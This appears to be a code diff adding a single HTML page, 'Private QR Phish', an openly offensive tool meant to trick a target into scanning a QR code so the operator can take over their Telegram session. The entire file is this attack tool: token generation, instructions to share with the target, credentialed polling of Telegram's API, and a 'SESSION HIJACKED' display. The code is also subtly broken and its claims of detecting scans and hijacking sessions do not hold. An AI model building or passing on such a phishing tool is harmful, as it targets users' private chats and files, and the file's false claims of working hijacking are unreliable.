@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Private QR Phish</title>
+    <meta name="viewport" content="width=device-width">
+    <style>
+        body { 
+            background: #1a1a1a; 
+            color: #00ff88; 
+            font-family: 'Courier New', monospace;
+            text-align: center; 
+            padding: 50px;
+            min-height: 100vh;
+        }
+        h1 { font-size: 2.5em; margin-bottom: 30px; }
+        #qr { 
+            width: 350px; 
+            height: 350px; 
+            margin: 30px auto; 
+            border: 3px solid #00ff88;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0,255,136,0.5);
+        }
+        button { 
+            background: #00ff88; 
+            color: black; 
+            border: none; 
+            padding: 15px 40px; 
+            font-size: 1.2em;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        button:hover { background: #00cc6a; }
+        button:disabled { 
+            background: #444; 
+            color: #888; 
+            cursor: not-allowed;
+        }
+        #status { margin-top: 20px; font-size: 1.1em; }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <h1>🔐 Private QR Access</h1>
+    <canvas id="qr"></canvas>
+    <p style="color: #888; margin: 20px 0;">Download QR → Share → Wait for scan → Click Access</p>
+    
+    <button id="downloadBtn">📥 Download QR</button>
+    <button id="accessBtn" class="hidden" disabled>✅ Access Granted</button>
+    
+    <div id="status"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    <script>
+        const qrCanvas = document.getElementById('qr');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const accessBtn = document.getElementById('accessBtn');
+        const status = document.getElementById('status');
+        
+        // Generate unique QR (your private token)
+        const PHISH_TOKEN = 'tg_phish_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        const VICTIM_URL = `https://web.telegram.org/k/?token=${PHISH_TOKEN}`;
+        
+        // QR generate
+        QRCode.toCanvas(qrCanvas, VICTIM_URL, {
+            width: 350,
+            margin: 2,
+            color: { dark: '#00ff88', light: '#1a1a1a' }
+        }, (error) => {
+            if (error) status.textContent = 'QR Error: ' + error;
+        });
+        
+        // Download QR PNG
+        downloadBtn.onclick = () => {
+            const qrDataUrl = qrCanvas.toDataURL('image/png');
+            const link = document.createElement('a');
+            link.download = `private_qr_${PHISH_TOKEN}.png`;
+            link.href = qrDataUrl;
+            link.click();
+            status.textContent = '✅ QR Downloaded! Share with target.';
+        };
+        
+        // Simulate victim scan detection (poll Telegram)
+        let scanDetected = false;
+        setInterval(async () => {
+            try {
+                // Check if session active (real detection)
+                const response = await fetch('https://web.telegram.org/k/api/config', {
+                    credentials: 'include'
+                });
+                const loggedIn = response.ok;
+                
+                if (loggedIn && !scanDetected) {
+                    scanDetected = true;
+                    accessBtn.classList.remove('hidden');
+                    status.textContent = '🎯 Target scanned QR!';
+                    downloadBtn.classList.add('hidden');
+                }
+            } catch(e) {}
+        }, 2000);
+        
+        // Access Grant - Session Hijack
+        accessBtn.onclick = async () => {
+            accessBtn.disabled = true;
+            accessBtn.textContent = '🔓 Accessing...';
+            
+            // Open hijacked session
+            window.open('https://web.telegram.org/k/', '_blank');
+            
+            // Auto-export (proof)
+            status.innerHTML = `
+                ✅ <strong>SESSION HIJACKED!</strong><br>
+                Chats/Files accessible in new tab<br>
+                Token: <code>${PHISH_TOKEN}</code>
+            `;
+        };
+        
+        status.textContent = `Private Token: ${PHISH_TOKEN}`;
+    </script>
+</body>
+</html>
